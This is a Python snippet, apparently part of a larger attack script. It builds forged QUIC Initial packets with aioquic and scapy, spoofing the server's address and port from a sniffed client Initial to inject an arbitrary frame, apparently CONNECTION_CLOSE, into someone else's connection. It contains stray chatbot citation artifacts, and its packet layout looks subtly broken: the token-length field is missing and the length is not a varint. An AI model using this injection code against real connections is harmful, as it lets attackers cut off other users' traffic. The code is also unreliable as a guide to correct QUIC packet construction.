# helpers_aioquic.py  (drop somewhere above handle_quic)

from aioquic.quic.crypto import CryptoPair                  
from aioquic.quic.packet import QuicProtocolVersion
from scapy.layers.inet import IP, UDP
from scapy.all import Raw

def forge_cc_aioquic(dcid: bytes,
                      tpl: tuple,
                      frame: bytes,
                      pn: int = 0) -> Raw:
    """
    Build a fully protected Initial carrying `frame`
    dcid   client-chosen Destination CID
    tpl    (src_ip, src_port, dst_ip, dst_port) from the sniffed Initial
    """
    pair = CryptoPair()
    pair.setup_initial(dcid, is_client=False,
                       version=QuicProtocolVersion.VERSION_1)
    aead, hp = pair.send.aead, pair.send.hp

    # --- bare long header up to PN (see RFC 8999 Fig. 2):contentReference[oaicite:5]{index=5}
    hdr  = bytearray(b"\xc3\x00\x00\x00\x01")      # Initial, version 1
    hdr += bytes([len(dcid)]) + dcid + b"\x00"     # DCID, empty SCID
    hdr += b"\x00\x00" + pn.to_bytes(4, "big")     # tmp length + PN

    ciphertext = aead.encrypt(pn, frame, hdr)      # AEAD_AES_128_GCM ◆ RFC 9001 §5.3:contentReference[oaicite:6]{index=6}
    hdr[6+len(dcid)+1:8+len(dcid)+1] = len(ciphertext).to_bytes(2, "big")

    # Header protection (RFC 9001 Fig. 6):contentReference[oaicite:7]{index=7}
    hp.apply(hdr, ciphertext[:16])
    

    pkt = (IP(src=tpl[2], dst=tpl[0]) /
           UDP(sport=tpl[3], dport=tpl[1]) /
           Raw(bytes(hdr) + ciphertext))
    return pkt
